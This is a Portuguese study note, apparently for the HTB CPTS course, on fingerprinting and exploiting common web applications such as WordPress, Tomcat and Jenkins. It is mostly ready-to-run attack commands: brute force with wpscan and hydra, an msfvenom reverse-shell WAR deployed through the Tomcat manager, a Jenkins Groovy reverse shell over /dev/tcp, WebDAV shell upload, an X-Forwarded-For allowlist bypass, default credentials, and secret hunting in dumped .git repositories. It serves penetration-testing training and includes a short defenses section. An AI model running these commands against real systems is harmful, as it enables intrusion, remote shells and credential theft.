---
tema: Web / Exploração
tópico: Attacking Common Applications — fingerprint e exploração de apps conhecidas
tags: [htb, cpts, wordpress, joomla, drupal, tomcat, jenkins, cms, web]
dificuldade: medium
---

# 🏢 CPTS 24 — Attacking Common Applications

> [!info] Objetivo
> A maioria das empresas não usa "uma app web desconhecida": usa **WordPress, Joomla, Drupal, Tomcat, Jenkins, Splunk, PRTG, GitLab, osTicket, ColdFusion** e servidores IIS/Apache/Nginx.
> Aqui o trabalho é: **fingerprint** → **versão** → **enumerar o que está exposto** → **explorar o que for vulnerável ou mal configurado** (credenciais padrão, painéis abertos, upload de plugin, path traversal).
> Regra de ouro: **identificar produto e versão antes de qualquer exploit**. Sem versão, o exploit é chute.

---

## 🎯 Quando usar

| Sinal | Direção |
|-------|---------|
| Página em `/wp-login.php`, `/wp-content/`, `/wp-json/` | WordPress |
| `/administrator/`, `/components/com_*` | Joomla |
| `/core/CHANGELOG.txt`, `/user/login`, meta "Drupal" | Drupal |
| Porta **8080/8443** com `/manager/html` ou `/docs` | Apache Tomcat |
| Porta **8080** com painel Jenkins, tela "Dashboard" | Jenkins |
| Porta **8000/8089** com Splunk | Splunk |
| Porta **8080** com PRTG "Network Monitor" | PRTG |
| Help desk, "Support Center", `/scp/` | osTicket |
| `/users/sign_in`, `/help`, `/explore` | GitLab |
| `/CFIDE/administrator/` | Adobe ColdFusion |
| Página padrão IIS/Apache/Nginx | Misconfig (WebDAV, listagem, arquivos sensíveis) |

---

## 🧰 Ferramentas

| Ferramenta | Uso |
|-----------|-----|
| **whatweb / Wappalyzer** | Fingerprint rápido de stack |
| **nmap** + `http-title`, `http-enum`, `http-headers` | Banner e títulos |
| **curl** | Checar headers, `Server`, cookies, `X-Powered-By` |
| **wpscan** | Enumeração e brute dedicados a WordPress |
| **droopescan** | Drupal / Joomla / Silverstripe |
| **joomscan** | Enumeração específica de Joomla |
| **searchsploit** | Mapear versão → exploit |
| **msfconsole** | Módulos prontos para apps conhecidas |
| **gobuster/feroxbuster** | Descobrir painéis, backups, `.git`, configs |
| **nuclei** | Templates de detecção em lote |

```bash
# Fingerprint básico
whatweb -a 3 http://<IP>
nmap -sV -p 80,443,8080,8443,8000,8089 <IP> --script http-title,http-headers

# Headers revelam muito
curl -i http://<IP>/ | grep -Ei 'server|x-powered-by|x-aspnet|set-cookie'
```

---

## 🖼️ 1. WordPress

### Enumeração

```bash
# Scan geral: versão, tema, plugins, usuários
wpscan --url http://<IP>/ --enumerate vp,vt,u --api-token <TOKEN> 2>/dev/null

# Plugins e temas sensíveis/vulneráveis (vp = vulnerable plugins, ap = all plugins)
wpscan --url http://<IP>/ -e ap,at,u

# Sem token: ainda funciona para enumeração básica, sem dados de vuln
wpscan --url http://<IP>/ -e u
```

```bash
# REST API vaza usuários sem autenticação (muito comum)
curl -s http://<IP>/wp-json/wp/v2/users | jq '.[].slug'
curl -s http://<IP>/?rest_route=/wp/v2/users
curl -s http://<IP>/wp-json/wp/v2/posts | jq '.[].author'

# Autor via redirect: /?author=1 redireciona para /author/<nome>/
curl -sI http://<IP>/?author=1 | grep -i location
```

### xmlrpc.php

```bash
# Está habilitado? Lista os métodos expostos
curl -s http://<IP>/xmlrpc.php -d '<methodCall><methodName>system.listMethods</methodName></methodCall>'

# Brute force via xmlrpc: multiplica tentativas em uma request (wp.getUsersBlogs)
curl -s http://<IP>/xmlrpc.php -d '
<methodCall><methodName>wp.getUsersBlogs</methodName><params>
<param><value>admin</value></param>
<param><value>senha</value></param>
</params></methodCall>'
```

> [!info] Pingback como SSRF
> `pingback.ping` faz o WordPress buscar uma URL sua. Use para confirmar SSRF interno, não para RCE.

### Brute e exploração

```bash
# Brute do wp-login (com throttle para não travar)
wpscan --url http://<IP>/ -U admin -P ~/wordlists/rockyou.txt \
       --password-attack wp-login --max-threads 20

# Depois do login: aparência do tema -> editor de arquivos -> PHP no functions.php
# OU upload de plugin malicioso (zip) em Plugins -> Adicionar novo
```

```bash
# Credenciais costumam vazar em backups
curl -s http://<IP>/wp-config.php.bak
curl -s http://<IP>/.wp-config.php.swp
curl -s http://<IP>/wp-config.php~ 
```

> [!warning] Não pule para o exploit
> Plugin desatualizado é o vetor mais comum em WordPress. Liste **versão de cada plugin** e cruze com `searchsploit`/wpscan antes de tentar brute.

---

## 🧩 2. Joomla

```bash
# Versão: arquivo público de manifesto
curl -s http://<IP>/administrator/manifests/files/joomla.xml | grep -i version
curl -s http://<IP>/language/en-GB/en-GB.xml | grep -i version

# Enumeração automatizada
joomscan -u http://<IP>/
droopescan scan joomla -u http://<IP>
```

```text
Pontos de interesse:
/administrator/                 -> painel de login
/configuration.php~             -> backup com credenciais do banco (se servido)
/components/com_*                -> componentes (SQLi/RCE em versões antigas)
/index.php?option=com_users&view=registration
```

```bash
# Template/editor PHP: com login admin -> Extensions -> Templates -> editar
# Componente clássico com RCE histórico: com_fields / com_media em versões antigas
# Descreva a CLASSE (SQLi / upload em componente) e valide a versão antes de usar exploit
```

```bash
# Brute do admin (form em /administrator/)
# Joomla 4+: 2FA pode existir; verifique antes
```

---

## 💧 3. Drupal

```bash
# Versão por CHANGELOG (Drupal 7) ou core/CHANGELOG (8+)
curl -s http://<IP>/CHANGELOG.txt | head -5
curl -s http://<IP>/core/CHANGELOG.txt | head -5

# Enumeração
droopescan scan drupal -u http://<IP>
```

```bash
# Enumeração de usuários (Drupal 7 clássico)
curl -s http://<IP>/?q=user/1
curl -s "http://<IP>/?q=admin/views/ajax/autocomplete/user/a"   # autocomplete vaza nomes
```

```text
Classes de falha histórico mais comum:
- "Drupalgeddon" (SQLi/RCE por formulário e por upload de avatar) em instalações 7.x/8.x antigas
- Módulos contrib desatualizados (REST, Coder, Webform) com RCE/SQLi
- Configuração: /sites/default/settings.php servido (credenciais do banco)
```

> [!warning] CVE só quando você lê a versão
> Drupalgeddon só funciona em faixas específicas. Confirme `CHANGELOG.txt` e a versão do módulo **antes** de rodar o exploit, ou você só vai gerar ruído.

---

## 🐱 4. Apache Tomcat

```bash
# Fingerprint e versão
curl -s http://<IP>:8080/ | grep -i tomcat
curl -sI http://<IP>:8080/docs/ | grep -i server

# Descobrir painéis
gobuster dir -u http://<IP>:8080/ -w /usr/share/seclists/Discovery/Web-Content/common.txt
# Alvos: /manager/html, /host-manager/html, /examples/
```

```bash
# Credenciais padrão / fracas primeiro: tomcat:tomcat, admin:admin, tomcat:s3cret
# Brute do Basic Auth do manager
hydra -C /usr/share/seclists/Passwords/Default-Credentials/tomcat-betterdefaultpasslist.txt \
      http-get://<IP>:8080/manager/html
```

### Deploy de WAR → RCE

```bash
# 1) Gerar o WAR com um JSP de reverse shell
msfvenom -p java/jsp_shell_reverse_tcp LHOST=<IP> LPORT=<PORT> -f war -o shell.war

# 2) Deploy via manager (autenticado) — texto plain
curl -u tomcat:tomcat --upload-file shell.war \
     "http://<IP>:8080/manager/text/deploy?path=/shell"

# 3) Disparar
curl "http://<IP>:8080/shell/"

# Alternativa GUI: /manager/html -> "WAR file to deploy" -> escolher shell.war
```

```bash
# Listener
nc -lvnp <PORT>
```

> [!tip] Manager bloqueado?
> Se `/manager` retorna 403 por IP, teste o `X-Forwarded-For`/`X-Real-IP` como `127.0.0.1` — configs antigas confiam no header. Se o manager é inacessível, procure `/examples` e CVE de deserialização/sessão.

---

## 🛠️ 5. Jenkins

```bash
# Fingerprint
curl -s http://<IP>:8080/ | grep -i jenkins
curl -s http://<IP>:8080/api/json
```

```text
Pontos-chave:
/script              -> Groovy Script Console (RCE se autenticado)
/manage              -> administração
/securityRealm/      -> configuração de auth
/people/             -> usuários
/cli                 -> CLI remota (se habilitada)
/asynchPeople/       -> lista usuários sem login (muitas versões)
```

```groovy
// Groovy Script Console -> reverse shell (substitua IP/PORT)
r = Runtime.getRuntime()
p = r.exec(["/bin/bash","-c","exec 5<>/dev/tcp/<IP>/<PORT>;cat <&5 | while read line; do \\$line 2>&5 >&5; done"] as String[])
p.waitFor()
```

```bash
# Se /script está aberto sem auth -> RCE direto.
# Se exige login: brute de credencial fraca, ou acesso anônimo em /asynchPeople/
```

> [!info] Por que Jenkins é alvo recorrente
> Script Console é RCE por design (é uma feature). O problema é exposição sem autenticação ou com credencial fraca, e plugins desatualizados.

---

## 📊 6. Splunk / PRTG / osTicket

| App | Portas / Path | Vetor típico |
|-----|---------------|--------------|
| **Splunk** | 8000 (web), 8089 (mgmt/REST), 9997 (forwarder) | Credencial padrão (`admin:changeme`); path traversal/SSRF na interface web de versões desatualizadas; REST API com token vazado; apps customizadas com script inseguro |
| **PRTG** | 8080 (web), 8443 | XSS persistente em notificações das versões antigas; command injection autenticado no cadastro de notificação; credencial padrão `prtgadmin:prtgadmin` |
| **osTicket** | 80/443, `/scp/` (staff), `/api/` | SQLi/traversal em versões antigas; upload de plugin em `/scp/plugins.php`; XSS em tickets; credenciais em `/include/ost-config.php.bak` |

```bash
# Splunk: testar credencial padrão e REST
curl -k -u admin:changeme https://<IP>:8089/services/apps/local
# Se autenticar, dá para instalar app maliciosa (RCE por design do mecanismo de apps)

# PRTG
curl -s -u prtgadmin:prtgadmin http://<IP>:8080/api/table.xml?content=sensors

# osTicket: procurar backup de config
curl -s http://<IP>/include/ost-config.php.bak
```

> [!warning] CVE só quando tiver certeza da versão
> Splunk/PRTG/osTicket têm muitas CVEs por faixa de versão. Confirme a versão pela própria UI ou banner e **descreva a classe** (traversal, command injection, XSS) se não puder confirmar. Não invente número.

---

## 🦊 7. GitLab, ColdFusion e outros

### GitLab
```bash
# Versão: página /help expõe a versão do GitLab na maioria dos deploys
curl -s http://<IP>/help | grep -i 'gitlab'
curl -s http://<IP>/api/v4/version -H "PRIVATE-TOKEN: <TOKEN>"

# Paths úteis
# /users/sign_in       -> login
# /explore             -> projetos públicos (source code + segredos)
# /-/profile/personal_access_tokens
# /api/v4/projects     -> enumeração de projetos
```

```text
Classes comuns: SSRF em importação de projeto (URL remota), path traversal em
routing de repositório, exfiltração de CI variables, RCE via pipeline de runner.
Sempre valide a versão antes de usar exploit; muitos exigem autenticação.
```

### Adobe ColdFusion
```bash
# Admin exposto
curl -s http://<IP>/CFIDE/administrator/ | grep -i coldfusion

# Versão e arquivos sensíveis
# /CFIDE/administrator/enter.cfm
# /CFIDE/scripts/ajax/FCKeditor/editor/filemanager/connectors/  (upload histórico)
```

```text
Classes históricas: path traversal no admin (lê password.properties) com null byte,
upload de arquivo via FCKeditor, deserialização. Descreva a classe e confirme a versão.
Muitas dessas rotas só existem em versões antigas do ColdFusion.
```

### Servidores web: IIS, Apache, Nginx

| Alvo | Verificação |
|------|------------|
| **IIS** | `/web.config` acessível? WebDAV com `PUT` habilitado? `_vti_bin`? Short-name (`~1`) disclosure? |
| **Apache** | `.htaccess` servido? Listagem de diretórios? `server-status`/`server-info`? `.git/` exposto? |
| **Nginx** | `alias` com traversal? `off-by-slash`? arquivos de backup (`index.php.bak`, `.swp`)? |

```bash
# WebDAV: testar PUT direto (upload de shell)
curl -X PUT -T shell.aspx http://<IP>/shell.aspx
davtest -url http://<IP>/ -auth user:pass

# Listagem de diretórios e arquivos sensíveis
gobuster dir -u http://<IP>/ -w /usr/share/seclists/Discovery/Web-Content/raft-medium-files.txt \
  -x php,bak,old,txt,zip,sql
```

---

## 🔑 8. Credenciais em arquivos de configuração

Um dos achados mais frequentes: configs servidas, backups no webroot ou repositórios expostos.

| Arquivo | App |
|---------|-----|
| `wp-config.php` / `.bak` / `~` / `.swp` | WordPress (DB user/senha, salts) |
| `configuration.php` / `configuration.php~` | Joomla |
| `sites/default/settings.php` | Drupal |
| `include/ost-config.php` | osTicket |
| `web.config`, `appsettings.json` | .NET/IIS |
| `.env`, `.env.bak` | Laravel, Node, Python |
| `settings.py`, `local_settings.py` | Django |
| `database.yml`, `config/database.yml` | Rails |

```bash
# Varredura por arquivos de config e backups
ffuf -w /usr/share/seclists/Discovery/Web-Content/raft-medium-files.txt:FUZZ \
     -u http://<IP>/FUZZ -e .bak,~,.old,.swp,.zip,.tar.gz,.sql -mc 200

# Procurar segredos em repo exposto (.git)
git-dumper http://<IP>/.git/ ./dumped
grep -rEi 'password|secret|api[_-]?key|token' ./dumped
```

```bash
# Credenciais encontradas -> reusar em: banco, SSH, painel admin, outros serviços
# Documente a origem exata (arquivo + linha) para o relatório
```

---

## 🛡️ 9. Defesas (lado azul)

| Controle | Efeito |
|----------|--------|
| Atualizar CMS/plugins/apps e remover os não usados | Fecha CVEs conhecidas |
| Não expor painéis administrativos à internet (VPN/reverse proxy com auth) | Reduz superfície |
| Trocar credenciais padrão e usar MFA | Mata brute e password spraying |
| Bloquear `xmlrpc.php`, `/script` do Jenkins, `/manager` sem auth | Remove RCE por design |
| Desabilitar listagem de diretório e negar `.bak`/`.git`/configs | Evita vazamento de credenciais |
| Menor privilégio no serviço (usuário dedicado) | Limita impacto |

---

## ⚠️ Pegadinhas

- **Sem versão, sem exploit**: fingerprint primeiro; versão errada = exploit errado = ruído e possível DoS.
- **Falso "não vulnerável"**: plugin pode estar desatualizado sem aparecer no banner. Consulte o `readme.txt` do plugin.
- **Brute que derruba**: contas costumam travar após N tentativas. Use wordlist curada e throttle.
- **`robots.txt` mente às vezes**: pode listar caminhos que existem **e** caminhos que não existem. Confirme.
- **Tokens de API vazados**: procure em JS, HTML, `.env`, respostas JSON. Muitas vezes vale mais que brute.
- **Painel atrás de proxy**: `X-Forwarded-For: 127.0.0.1` burla allowlist baseada em IP em configs antigas.
- **Não confunda 403 com inexistente**: 403 = existe e está protegido; 404 = não existe. Ajuste a enumeração.
- **CVE errada gera barulho**: se não confirmou a faixa de versão, descreva a classe da falha e valide manualmente.

---

## ✅ Checklist rápido

```text
[ ] Fingerprint: whatweb, headers, títulos, favicon hash
[ ] Identificar produto + versão exata
[ ] Listar painéis administrativos e endpoints conhecidos
[ ] checar credenciais padrão (lista de defaults) antes de brute
[ ] CMS: enumerar usuários, plugins/temas, versões (wpscan/droopescan/joomscan)
[ ] Procurar arquivos de config, backups e .git expostos
[ ] grep por password/secret/token nos arquivos achados
[ ] Testar xmlrpc.php, REST API, /help (versão), /api/json
[ ] Testar painéis de gestão (Tomcat manager, Jenkins /script, Splunk)
[ ] Validar CVE com searchsploit/nuclei ANTES de explorar
[ ] Explorar: deploy WAR (Tomcat), plugin (WordPress), Script Console (Jenkins)
[ ] Reusar credenciais encontradas em outros serviços
[ ] Documentar produto, versão, caminho, payload e impacto
```

---

## 🔗 Relacionado

- [[CPTS 23 - Web Attacks]]
- [[CPTS 21 - File Upload Attacks]]
- [[CPTS 09 - Using the Metasploit Framework]]
- [[CPTS 11 - Attacking Common Services]]
- [[Fase 05 - Enumeração Web]]
